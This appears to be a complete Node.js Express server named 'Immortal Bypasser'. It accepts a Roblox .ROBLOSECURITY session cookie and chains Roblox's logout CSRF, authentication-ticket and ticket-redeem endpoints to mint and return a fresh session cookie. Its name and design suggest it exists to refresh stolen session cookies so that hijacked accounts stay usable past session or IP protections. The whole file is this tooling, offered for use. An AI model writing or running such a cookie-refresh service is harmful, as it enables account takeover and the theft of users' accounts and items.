const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
app.use(cors());
app.use(express.json());

// ROOT
app.get('/', (req, res) => res.send('Immortal Bypasser — LIVE'));

// BYPASS
app.post('/api/bypass', async (req, res) => {
  const { cookie } = req.body;
  if (!cookie?.includes('.ROBLOSECURITY')) return res.status(400).json({ error: 'Invalid' });

  try {
    // 1. CSRF
    const logout = await axios.post('https://auth.roblox.com/v2/logout', {}, {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
      maxRedirects: 0,
      validateStatus: () => true
    });
    const csrf = logout.headers['x-csrf-token'];
    if (!csrf) throw new Error('No CSRF');

    // 2. TICKET
    const ticketRes = await axios.post('https://auth.roblox.com/v1/authentication-ticket', {}, {
      headers: {
        'x-csrf-token': csrf,
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'referer': 'https://www.roblox.com/'
      }
    });
    const ticket = ticketRes.headers['rbx-authentication-ticket'];
    if (!ticket) throw new Error('No ticket');

    // 3. REDEEM
    const redeem = await axios.post('https://auth.roblox.com/v1/authentication-ticket/redeem', {
      authenticationTicket: ticket
    }, {
      headers: { 'Content-Type': 'application/json' }
    });

    const newCookie = redeem.headers['set-cookie']
      ?.find(c => c.includes('.ROBLOSECURITY'))
      ?.split('.ROBLOSECURITY=')[1]
      ?.split(';')[0];

    if (!newCookie) throw new Error('No new cookie');

    res.json({ success: true, newCookie });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.listen(process.env.PORT || 3000);
